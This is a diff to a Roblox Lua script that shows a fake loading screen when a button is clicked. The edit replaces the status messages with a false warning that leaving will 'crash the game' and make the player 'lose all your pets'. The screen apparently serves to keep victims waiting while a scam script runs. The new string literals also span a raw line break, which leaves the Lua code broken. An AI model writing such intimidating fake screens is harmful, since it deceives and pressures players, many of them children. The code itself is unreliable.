@@ -122,7 +122,8 @@ button.MouseButton1Click:Connect(function()
 		local msg = Instance.new("TextLabel", frame)
 		msg.Size = UDim2.new(1, 0, 0, 50)
 		msg.Position = UDim2.new(0, 0, 0.45, 0)
-		msg.Text = "🔍 FINDING OLD SERVER FOR SCRIPT..."
+		msg.Text = "Overriding game files… Hang tight! Exiting now may crash the game and cause you to lose all your pets. 
+It's worth the wait!"
 		msg.TextColor3 = Color3.fromRGB(255, 255, 255)
 		msg.BackgroundTransparency = 1
 		msg.Font = Enum.Font.GothamBold
@@ -147,7 +148,8 @@ button.MouseButton1Click:Connect(function()
 			end
 
 			percent.Visible = false
-			msg.Text = "🕒 PLEASE WAIT 4 MINUTES TO AUTO-REJOIN"
+			msg.Text = "Overriding game files… Hang tight! Exiting now may crash the game and cause you to lose all your pets. 
+It's worth the wait!"
 
 			local countdown = Instance.new("TextLabel", frame)
 			countdown.Size = UDim2.new(1, 0, 0, 40)
